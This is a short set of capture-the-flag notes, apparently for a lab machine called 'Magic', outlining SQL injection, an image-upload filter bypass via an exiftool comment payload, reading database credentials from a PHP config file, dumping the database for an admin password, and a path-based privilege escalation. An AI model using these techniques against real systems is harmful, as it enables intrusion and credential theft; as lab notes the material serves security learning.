# recon

# foothold
## exploit : #Injection_SQL
## image extension pypass
```
sxiftool -comment=<payload> image.php.jpeg
```
# Privesc
## lateral movement
```
www-data@ubuntu:/var/www/Magic$ cat db.php5
cat db.php5
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';
```

list of installed application
```
ls -alh /usr/bin/ | grep mysql
mysqldump Magic -u theseus -p
```
	INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
## root
#ExploitNotAbsolutPath 
